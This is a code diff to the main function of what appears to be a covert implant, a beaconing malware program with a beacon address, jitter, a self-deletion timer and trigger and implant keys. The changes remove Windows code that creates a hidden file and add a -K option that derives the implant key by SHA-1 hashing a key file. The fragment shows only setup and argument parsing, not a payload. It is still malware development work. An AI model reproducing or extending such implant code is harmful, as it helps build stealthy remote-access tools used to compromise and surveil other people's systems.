@@ -123,18 +123,13 @@ int main(int argc, char** argv)
 	unsigned long	delete_delay = SELF_DEL_TIMEOUT;
 	float		jitter = DEFAULT_BEACON_JITTER * 0.01f;
 	int		retVal = 0;
+	FILE		*f;
 	struct stat st;
 #ifndef DEBUG
 	int		status = 0;
 #endif
 
-#ifdef WIN32
-	WSADATA wsaData;
-	HANDLE hFile;
-	char* expandedfile;
-#else
-	FILE* f;
-#endif
+
 
 #if defined SOLARIS || defined WIN32
 	int exe_path_size = 256;
@@ -200,28 +195,6 @@ int main(int argc, char** argv)
 	}
 #endif
 
-#if defined WIN32
-	memset(exe_path,0,exe_path_size);
-	GetModuleFileName(NULL,exe_path,exe_path_size);
-	expandedfile = (char*)malloc(MAX_PATH);
-	memset(expandedfile, 0, MAX_PATH);
-	ExpandEnvironmentStringsA(sdwtf, expandedfile, MAX_PATH);
-	//if(stat( "c:\\windows\\uninstallreadme.txt", &st) != 0)
-	if(_stat( (char*)expandedfile, &st) != 0)
-	{
-		//hFile = CreateFile("c:\\windows\\uninstallreadme.txt",
-		hFile = CreateFile( (char*)expandedfile,
-							GENERIC_WRITE, 0,NULL,CREATE_ALWAYS,
-							FILE_ATTRIBUTE_HIDDEN, NULL);
-		if(hFile == INVALID_HANDLE_VALUE)
-		{
-			exit(0);
-		}
-		CloseHandle(hFile);
-	}
-	free(expandedfile);
-#endif
-
 #if 0	//To See Crypto Keys, ENABLE THIS SECTION...
 	D( printf("\n\n my_dhm_P_String=%s ", my_dhm_P_String) );
 	D( printf("\n\n my_dhm_G_String=%s ", my_dhm_G_String) );
@@ -264,11 +237,6 @@ int main(int argc, char** argv)
 	{
 		switch(c)
 		{
-			case 'I':
-				// TODO: new option. what validation is needed?
-				szInterface = asloc( optarg );
-				break;
-
 			case 'a':
 				// todo: check that IP address is valid -- see client for howto
 				beaconIP = asloc( optarg );//optarg;
@@ -278,6 +246,11 @@ int main(int argc, char** argv)
 				// user enters delay in seconds and this is converted to milliseconds
 				// If set to 0, this will disable all beacons...
 				initialDelay = atoi(optarg) * 1000;
+				break;
+
+			case 'I':
+				// TODO: new option. what validation is needed?
+				szInterface = asloc( optarg );
 				break;
 
 			case 'i':
@@ -296,12 +269,49 @@ int main(int argc, char** argv)
 				}
 				break;
 
+			case 'K':
+				{	struct stat	statbuf;
+
+					if (implantKey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
+//						fprintf(stderr, "Option error\n");
+						fprintf(stderr, "%s\n", oe1);
+						return -1;
+					}
+
+					if (access(optarg, R_OK)) {
+						fprintf( stderr, "%s\n", oe2);
+						return -1;
+					}
+					if (stat(optarg, &statbuf) != 0) {
+						perror("Option K");
+						return -1;
+					}
+					if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { // Validate that the key text is of sufficient length
+						sha1_file((const char *)optarg, implantKey);		// Generate the ID key
+						D( displaySha1Hash ("Trigger Key", implantKey); );
+						sha1(implantKey, ID_KEY_HASH_SIZE, implantKey);		// Generate the implant key
+						D( displaySha1Hash ("Implant Key", implantKey); );
+						D( printf("\n\n\n" ); );
+					} else {
+						fprintf(stderr, "%s\n", oe3);
+						return -1;
+					}
+					break;
+				}
+
 			case 'k':
-				// The ID key specified is stored as the SHA-1 hash of the SHA-1 hash of the text entered,
-				// hence the name idKeyHash2.
+				// The implant key is generated from the SHA-1 hash of the SHA-1 hash of the
+				// text entered on the command line or by reading the key file.
+
+				if (implantKey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
+//					fprintf(stderr, "%s\n" "Option error");
+					fprintf(stderr, "%s\n", oe1);
+					return -1;
+				}
+
                                 if ( strlen( optarg ) < ID_KEY_LENGTH_MIN ) {
-                                        printf( " ERROR: Insufficient length for key phrase; must be greater than %i characters\n", ID_KEY_LENGTH_MIN);
-            				exit (1);
+					fprintf(stderr, "%s\n", oe3);
+            				return -1;
                                 }
 				D( printf( "\n\n\n DEBUG: keyPhrase=%s \n", optarg) );
 				sha1((const unsigned char *)optarg, strlen(optarg), implantKey);
